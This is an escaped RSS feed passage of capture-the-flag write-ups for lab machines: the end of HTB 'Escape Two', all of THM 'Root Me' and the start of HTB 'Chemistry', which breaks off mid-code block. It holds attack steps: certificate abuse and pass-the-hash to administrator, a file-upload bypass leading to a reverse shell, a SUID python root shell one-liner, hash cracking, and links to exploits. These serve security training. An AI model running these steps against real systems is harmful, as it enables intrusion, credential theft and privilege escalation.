&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Request ID is &lt;span class="m">22&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got certificate with multiple identifications
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> UPN: &lt;span class="s1">&amp;#39;administrator@sequel.htb&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DNS Host Name: &lt;span class="s1">&amp;#39;10.10.11.51&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Certificate has no object SID
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saved certificate and private key to &lt;span class="s1">&amp;#39;administrator_10.pfx&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now get the admin hash using the cert&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certipy v4.8.2 - by Oliver Lyak &lt;span class="o">(&lt;/span>ly4k&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Found multiple identifications in certificate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Please &lt;span class="k">select&lt;/span> one:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>0&lt;span class="o">]&lt;/span> UPN: &lt;span class="s1">&amp;#39;administrator@sequel.htb&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span> DNS Host Name: &lt;span class="s1">&amp;#39;10.10.11.51&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt; &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using principal: administrator@sequel.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to get TGT...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got TGT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saved credential cache to &lt;span class="s1">&amp;#39;administrator.ccache&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to retrieve NT &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;administrator&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;administrator@sequel.htb&amp;#39;&lt;/span>: xxxxxx:xxxx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Login as Admin and you got the root flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.51 -u &lt;span class="s2">&amp;#34;administrator&amp;#34;&lt;/span> -H &lt;span class="s2">&amp;#34;xxxxxxx&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/18.png"
width="488"
height="213"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/18_hu_e8242c726659c9d2.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/18_hu_467f085c1eb2fde7.png 1024w"
loading="lazy"
alt="Admin Flag"
class="gallery-image"
data-flex-grow="229"
data-flex-basis="549px"
>&lt;/p>
&lt;h3 id="conclusion">Conclusion
&lt;/h3>&lt;p>This machine covers topics like SMB shares leaks, MSSQL RCE, ESC4 Certificate Attack, Shadow Credentials Attack, weak ACLs and AD CS misconfigurations&lt;/p>
&lt;p>&lt;mark>Hope you enjoy it and Happy Hacking!&lt;/mark>&lt;/p></description></item><item><title>THM Root Me - Writeup</title><link>https://solarspectre.github.io/p/thm-root-me-writeup/</link><pubDate>Wed, 05 Mar 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/thm-root-me-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/cover.png" alt="Featured image of post THM Root Me - Writeup" />&lt;p>Let&amp;rsquo;s start with a fast scan, i normally use rustscan to gather the open ports faster:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">rustscan --top -a &amp;lt;victim_ip&amp;gt; &lt;span class="p">|&lt;/span> tee initialScan.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/1.png"
width="526"
height="701"
srcset="https://solarspectre.github.io/p/thm-root-me-writeup/1_hu_9c53525f83bf454b.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/1_hu_c333d88834b69866.png 1024w"
loading="lazy"
alt="Image 1"
class="gallery-image"
data-flex-grow="75"
data-flex-basis="180px"
>
once it&amp;rsquo;s finished, i copy the open ports and scan them with nmap looking out for the versions of the services hosted in those ports&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl"> sudo nmap -sC -sV -p&amp;lt;ports&amp;gt; &amp;lt;ip&amp;gt; -oN targeted
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/2.png"
width="647"
height="411"
srcset="https://solarspectre.github.io/p/thm-root-me-writeup/2_hu_d5498e0f5e48e977.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/2_hu_b1b043e898df6153.png 1024w"
loading="lazy"
alt="Image 2"
class="gallery-image"
data-flex-grow="157"
data-flex-basis="377px"
>
Now, the scan shows that the machine is hosting a web server with Apache, we can take a look at the directories the website has with gobuster&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">gobuster dir -t &lt;span class="m">45&lt;/span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://&amp;lt;ip&amp;gt;/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/3.png"
width="662"
height="412"
srcset="https://solarspectre.github.io/p/thm-root-me-writeup/3_hu_58353679a81d8403.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/3_hu_9dd1b6fde54a44b9.png 1024w"
loading="lazy"
alt="Image 3"
class="gallery-image"
data-flex-grow="160"
data-flex-basis="385px"
>&lt;/p>
&lt;h3 id="task-2">Task 2
&lt;/h3>&lt;pre>&lt;code>How many ports are open? 2
What version of Apache is running? 2.4.29
What service is running on port 22? SSH
What is the hidden directory? /panel/
&lt;/code>&lt;/pre>
&lt;h3 id="user-flag">User Flag
&lt;/h3>&lt;p>Visiting the website shows us this
&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/4.png"
width="972"
height="345"
srcset="https://solarspectre.github.io/p/thm-root-me-writeup/4_hu_cc81225b523a90b0.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/4_hu_67f4a1f1d982539f.png 1024w"
loading="lazy"
alt="Image 4"
class="gallery-image"
data-flex-grow="281"
data-flex-basis="676px"
>
and going to the /panel route shows a file upload page
&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/5.png"
width="1072"
height="813"
srcset="https://solarspectre.github.io/p/thm-root-me-writeup/5_hu_75fa1584ddc2e02f.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/5_hu_a36a5ccacd0c767d.png 1024w"
loading="lazy"
alt="Image 5"
class="gallery-image"
data-flex-grow="131"
data-flex-basis="316px"
>
There&amp;rsquo;s an arbitrary file upload vulnerability in this page, allowing us to upload a maliciously crafted php file that we can use to upload and execute a reverse shell, you can use this shell from pentestmonkey
&lt;a class="link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener"
>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/6.png"
width="674"
height="634"
srcset="https://solarspectre.github.io/p/thm-root-me-writeup/6_hu_28dc4c913f1a2e6f.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/6_hu_306e548438f0d55d.png 1024w"
loading="lazy"
alt="Image 6"
class="gallery-image"
data-flex-grow="106"
data-flex-basis="255px"
>&lt;/p>
&lt;p>But php is not allowed to be uploaded, we can bypass this validation changing the file extension to be php5&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/7.png"
width="613"
height="603"
srcset="https://solarspectre.github.io/p/thm-root-me-writeup/7_hu_6841a7345ed24010.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/7_hu_c1eeaf36a3415c35.png 1024w"
loading="lazy"
alt="Image 7"
class="gallery-image"
data-flex-grow="101"
data-flex-basis="243px"
>&lt;/p>
&lt;p>Then start a listener with netcat:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4242&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>navigate to the route where your file is uploaded, for example: /uploads/shell.php5
and you got the shell&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/8.png"
width="542"
height="188"
srcset="https://solarspectre.github.io/p/thm-root-me-writeup/8_hu_265562d5df2d7729.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/8_hu_c839516de95e6fca.png 1024w"
loading="lazy"
alt="Image 8"
class="gallery-image"
data-flex-grow="288"
data-flex-basis="691px"
>&lt;/p>
&lt;p>Once obtained the shell, let&amp;rsquo;s find the flag and get it!&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">find / -name user.txt 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat /var/www/user.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="root-flag">Root Flag
&lt;/h3>&lt;p>Find binaries with SUID permissions that allow users to execute the binary with the permissions of the owner of the file, rather than the user who runs the command (most of the times is root).&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">find / -perm -4000 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And look at that, python? Let&amp;rsquo;s check what user is the owner of the binary&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ls -la /usr/bin/python
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rwsr-sr-x 1 root root 3665768 Aug 4 2020 /usr/bin/python
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Sweet! it&amp;rsquo;s root. You can use gtfobins to look for info about a binary you can possibly use to escalate privileges:
&lt;a class="link" href="https://gtfobins.github.io/gtfobins/python/" target="_blank" rel="noopener"
>https://gtfobins.github.io/gtfobins/python/&lt;/a>
&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/10.png"
width="833"
height="247"
srcset="https://solarspectre.github.io/p/thm-root-me-writeup/10_hu_67200d7dbc8eec37.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/10_hu_542ba0758df375d6.png 1024w"
loading="lazy"
alt="Image 9"
class="gallery-image"
data-flex-grow="337"
data-flex-basis="809px"
>
we can execute a oneliner to spawn a shell as root and obtain the final flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">/usr/bin/python -c &lt;span class="s1">&amp;#39;import os; os.execl(&amp;#34;/bin/sh&amp;#34;,&amp;#34;sh&amp;#34;,&amp;#34;-p&amp;#34;)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/9.png"
width="514"
height="74"
srcset="https://solarspectre.github.io/p/thm-root-me-writeup/9_hu_dd7f58f0fc440341.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/9_hu_9c49c8e7a0df4b64.png 1024w"
loading="lazy"
alt="Image 10"
class="gallery-image"
data-flex-grow="694"
data-flex-basis="1667px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">cat /root/root.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>and you got the root flag!!&lt;/p>
&lt;h3 id="conclusion">Conclusion
&lt;/h3>&lt;p>This machine covers topics like Arbitrary File Uploads and exploiting binaries with SUID permissions to escalate privileges.&lt;/p>
&lt;p>&lt;mark>Hope you enjoyed it and Happy Hacking!&lt;/mark>&lt;/p></description></item><item><title>HTB Chemistry - Writeup</title><link>https://solarspectre.github.io/p/htb-chemistry-writeup/</link><pubDate>Thu, 20 Feb 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/htb-chemistry-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/cover.png" alt="Featured image of post HTB Chemistry - Writeup" />&lt;p>Let&amp;rsquo;s start with a fast scan, i normally use rustscan to gather the open ports faster:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">rustscan --top -a &amp;lt;victim_ip&amp;gt; &lt;span class="p">|&lt;/span> tee initialScan.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/1.png"
width="797"
height="615"
srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/1_hu_57bd9480770c7579.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/1_hu_155c8e7454c49020.png 1024w"
loading="lazy"
alt="Image 1"
class="gallery-image"
data-flex-grow="129"
data-flex-basis="311px"
>
once it&amp;rsquo;s finished, i copy the open ports and scan them with nmap looking out for the versions of the services hosted in those ports&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl"> sudo nmap -sC -sV -p&amp;lt;ports&amp;gt; &amp;lt;ip&amp;gt; -oN targeted
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/2.png"
width="736"
height="362"
srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/2_hu_676310d6f9b6d8df.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/2_hu_d717babb291fc7de.png 1024w"
loading="lazy"
alt="Image 2"
class="gallery-image"
data-flex-grow="203"
data-flex-basis="487px"
>
Now, the scan shows that the machine is hosting a web server with Python, we can take a look at the website to investigate more using burpsuite as a proxy to intercept all the traffic.
Register an account and login to it.&lt;/p>
&lt;h3 id="user-flag">User Flag
&lt;/h3>&lt;p>There&amp;rsquo;s an Arbitrary code execution vulnerability in the dashboard, allowing us to upload a maliciously crafted cfi file that we can use to upload and execute a reverse shell
&lt;a class="link" href="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f" target="_blank" rel="noopener"
>https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f&lt;/a>
Just upload it and view it to execute the reverse shell&lt;/p>
&lt;p>Once obtained the shell, let&amp;rsquo;s enumerate the contents in the directory
&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/3.png"
width="451"
height="89"
srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/3_hu_ac257078e4b5d7ad.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/3_hu_c6e85f7cfa51a7c5.png 1024w"
loading="lazy"
alt="Image 3"
class="gallery-image"
data-flex-grow="506"
data-flex-basis="1216px"
>&lt;/p>
&lt;p>There&amp;rsquo;s a users table where they store the credentials&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sqlite3 database.db &lt;span class="s1">&amp;#39;select * from user;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/4.png"
width="544"
height="326"
srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/4_hu_6795b5d12c6eae49.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/4_hu_49c92ef2b740dbec.png 1024w"
loading="lazy"
alt="Image 4"
class="gallery-image"
data-flex-grow="166"
data-flex-basis="400px"
>&lt;/p>
&lt;p>You can crack it with hashcat&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">0&lt;/span> creds.txt rockyou.txt --user
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>You can try the credentials you obtained to login to the dashboard, maybe they used the same credentials to login to ssh&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/5.png"
width="452"
height="72"
srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/5_hu_414c292065e10b97.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/5_hu_e87de07bdd1c06e0.png 1024w"
loading="lazy"
alt="Image 5"
class="gallery-image"
data-flex-grow="627"
data-flex-basis="1506px"
>&lt;/p>
&lt;p>rosa&amp;hellip; why?
anyways, here&amp;rsquo;s your user flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">cat user.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="root-flag">Root Flag
&lt;/h3>&lt;p>Find other ports that the host is using but aren&amp;rsquo;t public&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netstat -tuln
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/6.png"
width="605"
height="179"
srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/6_hu_194f95f62c8cbeb4.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/6_hu_72dfd5d65b7e667e.png 1024w"
loading="lazy"
alt="Image 6"
class="gallery-image"
data-flex-grow="337"
data-flex-basis="811px"
>&lt;/p>
&lt;p>Using port forward, we can see the contents of that page&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">ssh -L 5555:localhost:8080 rosa@10.10.11.38
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/9.png"
width="1185"
height="562"
srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/9_hu_6ffb099e42e9af03.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/9_hu_fff8a48ba18fa328.png 1024w"
loading="lazy"
alt="Image 7"
class="gallery-image"
data-flex-grow="210"
data-flex-basis="506px"
>&lt;/p>
&lt;p>we can also use whatweb to see the technologies that the page uses&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">whatweb http://localhost:5555
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/8.png"
width="856"
height="35"
srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/8_hu_9b6ca95ab9731b99.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/8_hu_aaa1b6a0e5c9e701.png 1024w"
loading="lazy"
alt="Image 8"
class="gallery-image"
data-flex-grow="2445"
data-flex-basis="5869px"
>&lt;/p>
&lt;p>look for directories with gobuster&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/7.png"
width="520"
height="261"
srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/7_hu_9515a105f408ed59.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/7_hu_96b7ec983c9c26d5.png 1024w"
loading="lazy"
alt="Image 9"
class="gallery-image"
data-flex-grow="199"
data-flex-basis="478px"
>&lt;/p>
&lt;p>looking for vulnerabilities of the website technologies you can find the CVE-2024-23334
for the &lt;strong>Aiohttp&lt;/strong> version that the website is using, here&amp;rsquo;s a python script that exploits it:
&lt;a class="link" href="https://github.com/wizarddos/CVE-2024-23334" target="_blank" rel="noopener"
>https://github.com/wizarddos/CVE-2024-23334&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
